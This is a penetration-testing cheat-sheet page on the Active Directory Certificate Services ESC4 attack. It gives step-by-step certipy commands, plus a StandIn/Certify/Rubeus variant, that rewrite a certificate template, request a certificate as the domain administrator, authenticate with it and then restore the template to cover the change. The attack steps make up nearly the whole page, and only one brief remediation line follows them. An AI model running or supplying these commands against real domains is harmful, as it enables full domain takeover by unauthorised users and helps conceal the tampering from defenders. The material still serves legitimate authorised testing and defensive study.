# ESC4 - Vulnerable Template Access Control (Write Permissions)

## Why It's Vulnerable

Your low-priv user has **write permissions on the template itself**. You don't exploit a misconfig - you *create one* by modifying the template to be vulnerable to [ESC1](esc1.md), then request a cert, then optionally change it back.

Write rights on a template are often granted via forgotten ACLs, nested groups, or delegated admin roles - surface them with [BloodHound](../../enumeration/bloodhound.md) and [ACL Abuse](../acl-abuse.md) queries.

## The Attack

**Step 1 - Modify the template to enable ESC1 conditions**
```sh
certipy template -u user@corp.local -p pass -dc-ip <DC-IP> \
  -template VulnerableTemplate \
  -save-old    # saves original settings so you can restore after

# certipy automatically makes the template ESC1-vulnerable
```

**Step 2 - Request a cert as DA (now ESC1 applies)**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local
```

**Step 3 - Restore the original template (clean up)**
```sh
certipy template -u user@corp.local -p pass -dc-ip <DC-IP> \
  -template VulnerableTemplate \
  -configuration VulnerableTemplate.json
```

**Step 4 - Authenticate**
```sh
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

### Certify.exe (Windows alternative)

Certify itself does not modify template DACLs. Two-tool combo:

```powershell
# Step 1: modify the template (StandIn) - flips ENROLLEE_SUPPLIES_SUBJECT + adds Client Auth EKU
StandIn.exe --adcs --filter VulnerableTemplate --edit --enrollflag 0x9 --ekus 1.3.6.1.5.5.7.3.2

# Step 2-3: same as ESC1
Certify.exe request /ca:CA-HOST\CORP-CA /template:VulnerableTemplate /altname:administrator
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials

# Cleanup: revert template
StandIn.exe --adcs --filter VulnerableTemplate --edit --enrollflag <original> --ekus <original>
```

---

## Remediation

Audit DACLs on all certificate templates. Only Domain Admins / CA admins should have write access to templates.
